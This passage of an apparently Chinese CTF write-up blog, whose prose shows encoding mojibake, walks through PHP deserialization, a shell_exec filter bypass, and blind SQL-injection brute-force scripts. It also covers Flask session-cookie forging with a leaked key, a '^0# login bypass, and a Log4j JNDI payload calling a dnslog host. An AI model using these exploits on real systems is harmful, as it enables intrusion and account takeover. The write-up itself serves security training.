tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;é²å‹ƒ,åˆ«å‚»æ„£ç€!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!</span><br><span class="line">We Come To HNCTF,Enjoy the ser14l1zti0n</span><br></pre></td></tr></table></figure>

<h2 id="SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-RCE-PLUS"><a href="#SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-RCE-PLUS" class="headerlink" title="[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS"></a>[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);   </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>shell_exec()</code>æ˜¯ä¸€ä¸ªå†…ç½®çš„PHPå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ã€‚è¿™ä¸ªå‡½æ•°ä¼šç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œå¹¶è¿”å›å‘½ä»¤çš„å®Œæ•´è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œå¤±è´¥æˆ–æ²¡æœ‰è¾“å‡ºï¼Œå®ƒå°†è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</p>
</li>
<li><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&#x27;ls -l&#x27;);</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç”±äºæ²¡æœ‰ç›¸å…³æ‰“å°çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å†™å…¥æ–‡ä»¶è¯»å–</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /&gt; 1.txt</span><br><span class="line">cat /fl*&gt; 2.txt</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬äº”ç©ºé—´-2021-yet-another-mysql-injection"><a href="#ç¬¬äº”ç©ºé—´-2021-yet-another-mysql-injection" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]yet_another_mysql_injection"></a>[ç¬¬äº”ç©ºé—´ 2021]yet_another_mysql_injection</h2><p>æç¤º&#x2F;?source</p>
<p>æ‰¾åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;/index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;è´¦å·&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;å¯†ç &quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> / value=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿‡æ»¤likeï¼Œå¯ä»¥å°è¯•likeæŠ¥é”™æ³¨å…¥ï¼Œ<code>%</code>æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œè¡¨ç¤ºä»»æ„æ•°é‡çš„ä»»æ„å­—ç¬¦ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28612&#x27;</span><br><span class="line"></span><br><span class="line">paylaod_list = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in paylaod_list:</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;: f&quot;1&#x27;/**/or/**/password/**/like/**/&#x27;&#123;i&#125;%&#x27;#&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    re = requests.post(url,data = data)</span><br><span class="line">    print(f&quot;i=&#123;i&#125; &#123;re.text&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240724210724412.png" alt="image-20240724210724412"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28612&#x27;</span></span><br><span class="line"></span><br><span class="line">paylaod_list = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paylaod_list:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;1&#x27;/**/or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;i&#125;</span>%&#x27;#&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        re = requests.post(url,data = data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong password&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28612&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">zifu=<span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(zifu)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> zifu:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag+i&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240724212618274.png" alt="image-20240724212618274"></p>
<h2 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>æ³¨å†Œè´¦å·è¿›å»æ‹¿flag</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727210036935.png" alt="image-20240727210036935"></p>
<p>å¿˜è®°å¯†ç å¤„æœ‰secretkey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- secretkey: th3f1askisfunny --&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240727210155883.png" alt="image-20240727210155883"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727210408582.png" alt="image-20240727210408582"></p>
<p>ç›´æ¥æ‹¿å»è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s &quot;th3f1askisfunny&quot; -c &quot;.eJwlzsENwzAIAMBd_O7DwQZMlonAgNqv07yq7t5IneDuU45ccT7L_l5XPMrx8rKX0ZVhcDK1FAgCaBLYK_lskDMMJ4ZvDFWydUBB28CmW3LL2kRJtM9qJoiJZAQdYPTgUNdpLIQ-whSpsjM3F8esyqY3wLOWO3Kdsf4bKN8frIcvsQ.ZqTwRQ.gQDifRFlzKt9DirA8xhKUx8c45E&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727210430001.png" alt="image-20240727210430001"></p>
<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;84a7287f763f92e62239e5406dc32fceb5c5ed17209f342595b12bcdbf73f039a69a4c0bb955f56b6242284e7eadacb7965d8eba5607d773d9d5f0a7badc37c0&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸€ä¸‹ï¼Œadminçš„idå±æ€§ç›´æ¥ç›²çŒœ1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;84a7287f763f92e62239e5406dc32fceb5c5ed17209f342595b12bcdbf73f039a69a4c0bb955f56b6242284e7eadacb7965d8eba5607d773d9d5f0a7badc37c0&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;th3f1askisfunny&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;84a7287f763f92e62239e5406dc32fceb5c5ed17209f342595b12bcdbf73f039a69a4c0bb955f56b6242284e7eadacb7965d8eba5607d773d9d5f0a7badc37c0&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240727210937825.png" alt="image-20240727210937825"></p>
<p>æ›¿æ¢cookieæ‹¿flag</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727211017752.png" alt="image-20240727211017752"></p>
<h2 id="ç™»é™†å°±æœ‰flag"><a href="#ç™»é™†å°±æœ‰flag" class="headerlink" title="ç™»é™†å°±æœ‰flag"></a>ç™»é™†å°±æœ‰flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^0#</span><br></pre></td></tr></table></figure>

<p><strong>ç©ºå¼‚æˆ–0ä¼šæŸ¥åˆ°æ‰€æœ‰éæ•°å­—å¼€å¤´çš„è®°å½•</strong></p>
<p>å¼•å·å¯ä»¥ç”¨äºé—­åˆï¼Œäº•å·å¯ä»¥ç”¨äºæ³¨é‡Šï¼Œ^è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç­‰å·å°±æ˜¯åˆ¤ç­‰</p>
<h2 id="Log4jå¤ç°"><a href="#Log4jå¤ç°" class="headerlink" title="Log4jå¤ç°"></a>Log4jå¤ç°</h2><p><strong>å‰ç½®çŸ¥è¯†</strong><br><strong>LDAP</strong><br>è½»é‡çº§çš„ç›®å½•æœå¯»åè®®ï¼Œæä¾›ç›®å½•æœåŠ¡</p>
<p><strong>JNDI</strong><br>Javaçš„ä¸€ä¸ªæ¥å£ï¼ŒJNDIé¿å…äº†ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„ç´§è€¦åˆ</p>
<p>æˆ‘ä»¬å¹³å¸¸è¯´çš„ LDAP Serverï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å®‰è£…å¹¶é…ç½®äº† Active Directoryã€OpenLDAP è¿™äº›ç¨‹åºçš„æœåŠ¡å™¨</p>
<p><strong>dnslog</strong><br>Aè®°å½•ï¼šAddress åŸŸåå¯¹åº”çš„IPåœ°å€</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sunny11/p/14399420.html">https://www.cnblogs.com/sunny11/p/14399420.html</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807192941789.png" alt="image-20240807192941789"></p>
<p>PAYLOAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://r0303l.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807193103537.png" alt="image-20240807193103537"></p>
<p>å­˜åœ¨ç›¸å…³æ¼æ´</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807193111668.png" alt="image-20240807193111668"></p>
<p>log4jä¼šè®°å½•æ•°æ®åŒ…çš„ä¸€äº›å†…å®¹ï¼ˆæ¯”å¦‚urlã€cookieç­‰ç­‰ï¼‰ï¼Œæ­¤å¤–ï¼Œä»–è¿˜æ‹¥æœ‰ä¸€å®šæ•°æ®åˆ†æå¤„ç†èƒ½åŠ›ï¼Œè¿™ç§èƒ½åŠ›èƒ½å¤Ÿç®€åŒ–ç¨‹åºå‘˜çš„å¼€å‘ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†log4jçš„è¿™ä¸ªæ¼æ´ã€‚</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/af2678fe032fc71d16d913d38f6535dd.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 